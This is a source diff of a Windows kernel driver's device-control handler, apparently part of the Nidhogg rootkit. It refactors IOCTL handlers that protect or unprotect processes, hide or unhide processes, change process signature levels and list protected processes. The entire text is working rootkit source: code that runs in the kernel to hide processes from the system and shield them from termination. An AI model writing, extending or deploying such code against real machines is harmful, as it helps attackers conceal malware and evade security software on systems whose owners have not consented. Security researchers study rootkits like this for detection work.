@@ -3,10 +3,6 @@
 #include "MemoryHelper.hpp"
 #include "MemoryAllocator.hpp"
 
-constexpr auto IsValidSize = [](_In_ size_t dataSize, _In_ size_t structSize) -> bool {
-	return dataSize != 0 && dataSize % structSize == 0;
-};
-
 // ** IOCTLS **********************************************************************************************
 #define IOCTL_PROTECT_UNPROTECT_PROCESS CTL_CODE(0x8000, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)
 #define IOCTL_CLEAR_PROCESS_PROTECTION CTL_CODE(0x8000, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS)
@@ -71,7 +67,7 @@ NTSTATUS NidhoggDeviceControl(_In_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP Irp
 	switch (stack->Parameters.DeviceIoControl.IoControlCode) {
 	case IOCTL_PROTECT_UNPROTECT_PROCESS:
 	{
-		ProtectedProcess protectedProcess{};
+		IoctlProcessEntry protectedProcess = { 0 };
 
 		if (!Features.ProcessProtection) {
 			Print(DRIVER_PREFIX "Due to previous error, process protection feature is unavaliable.\n");
@@ -80,47 +76,33 @@ NTSTATUS NidhoggDeviceControl(_In_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP Irp
 		}
 		auto size = stack->Parameters.DeviceIoControl.InputBufferLength;
 
-		if (!IsValidSize(size, sizeof(ProtectedProcess))) {
+		if (!IsValidSize(size, sizeof(IoctlProcessEntry))) {
 			status = STATUS_INVALID_BUFFER_SIZE;
 			break;
 		}
 
-		auto data = static_cast<ProtectedProcess*>(Irp->AssociatedIrp.SystemBuffer);
+		auto data = static_cast<IoctlProcessEntry*>(Irp->AssociatedIrp.SystemBuffer);
 		protectedProcess.Pid = data->Pid;
-		protectedProcess.Protect = data->Protect;
+		protectedProcess.Remove = data->Remove;
 
 		if (!IsValidPid(protectedProcess.Pid)) {
 			status = STATUS_INVALID_PARAMETER;
 			break;
 		}
 
-		if (protectedProcess.Protect) {
-			if (NidhoggProccessUtils->GetProtectedProcessesCount() == MAX_PIDS) {
-				status = STATUS_TOO_MANY_CONTEXT_IDS;
+		if (protectedProcess.Remove) {
+			if (!NidhoggProccessUtils->RemoveProcess(protectedProcess.Pid, ProcessType::Protected)) {
+				status = STATUS_NOT_FOUND;
 				break;
 			}
-
-			if (NidhoggProccessUtils->FindProcess(protectedProcess.Pid))
-				break;
-
-			if (!NidhoggProccessUtils->AddProcess(protectedProcess.Pid)) {
+			Print(DRIVER_PREFIX "Unprotecting process with pid %d.\n", protectedProcess.Pid);
+		}
+		else {
+			if (!NidhoggProccessUtils->AddProtectedProcess(protectedProcess.Pid)) {
 				status = STATUS_UNSUCCESSFUL;
 				break;
 			}
 			Print(DRIVER_PREFIX "Protecting process with pid %d.\n", protectedProcess.Pid);
-		}
-		else {
-			if (NidhoggProccessUtils->GetProtectedProcessesCount() == 0) {
-				status = STATUS_NOT_FOUND;
-				break;
-			}
-
-			if (!NidhoggProccessUtils->RemoveProcess(protectedProcess.Pid)) {
-				status = STATUS_NOT_FOUND;
-				break;
-			}
-
-			Print(DRIVER_PREFIX "Unprotecting process with pid %d.\n", protectedProcess.Pid);
 		}
 
 		len += size;
@@ -134,40 +116,40 @@ NTSTATUS NidhoggDeviceControl(_In_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP Irp
 			status = STATUS_UNSUCCESSFUL;
 			break;
 		}
-		NidhoggProccessUtils->ClearProtectedProcesses();
+		NidhoggProccessUtils->ClearProcessList(ProcessType::Protected);
 		break;
 	}
 
 	case IOCTL_HIDE_UNHIDE_PROCESS:
 	{
-		HiddenProcess hiddenProcess{};
+		IoctlProcessEntry hiddenProcess = { 0 };
 		auto size = stack->Parameters.DeviceIoControl.InputBufferLength;
 
-		if (!IsValidSize(size, sizeof(HiddenProcess))) {
+		if (!IsValidSize(size, sizeof(IoctlProcessEntry))) {
 			status = STATUS_INVALID_BUFFER_SIZE;
 			break;
 		}
 
-		auto data = static_cast<HiddenProcess*>(Irp->AssociatedIrp.SystemBuffer);
+		auto data = static_cast<IoctlProcessEntry*>(Irp->AssociatedIrp.SystemBuffer);
 		hiddenProcess.Pid = data->Pid;
-		hiddenProcess.Hide = data->Hide;
+		hiddenProcess.Remove = data->Remove;
 
 		if (!IsValidPid(hiddenProcess.Pid)) {
 			status = STATUS_INVALID_PARAMETER;
 			break;
 		}
 
-		if (hiddenProcess.Hide) {
-			status = NidhoggProccessUtils->HideProcess(hiddenProcess.Pid);
-
-			if (NT_SUCCESS(status))
-				Print(DRIVER_PREFIX "Hid process with pid %d.\n", hiddenProcess.Pid);
-		}
-		else {
+		if (hiddenProcess.Remove) {
 			status = NidhoggProccessUtils->UnhideProcess(hiddenProcess.Pid);
 
 			if (NT_SUCCESS(status))
 				Print(DRIVER_PREFIX "Unhide process with pid %d.\n", hiddenProcess.Pid);
+		}
+		else {
+			status = NidhoggProccessUtils->HideProcess(hiddenProcess.Pid);
+
+			if (NT_SUCCESS(status))
+				Print(DRIVER_PREFIX "Hid process with pid %d.\n", hiddenProcess.Pid);
 		}
 
 		len += size;
@@ -202,7 +184,7 @@ NTSTATUS NidhoggDeviceControl(_In_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP Irp
 
 	case IOCTL_SET_PROCESS_SIGNATURE_LEVEL:
 	{
-		ProcessSignature processSignature{};
+		ProcessSignature processSignature = { 0 };
 		auto size = stack->Parameters.DeviceIoControl.InputBufferLength;
 
 		if (!IsValidSize(size, sizeof(ProcessSignature))) {
@@ -239,13 +221,12 @@ NTSTATUS NidhoggDeviceControl(_In_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP Irp
 		}
 		auto size = stack->Parameters.DeviceIoControl.OutputBufferLength;
 
-		if (!IsValidSize(size, sizeof(OutputProtectedProcessesList))) {
+		if (!IsValidSize(size, sizeof(IoctlProcessList))) {
 			status = STATUS_INVALID_BUFFER_SIZE;
 			break;
 		}
-		auto data = static_cast<OutputProtectedProcessesList*>(Irp->AssociatedIrp.SystemBuffer);
-		NidhoggProccessUtils->QueryProtectedProcesses(data);
-
+		auto data = static_cast<IoctlProcessList*>(Irp->AssociatedIrp.SystemBuffer);
+		NidhoggProccessUtils->ListProtectedProcesses(data);
 		len += size;
 		break;
 	}
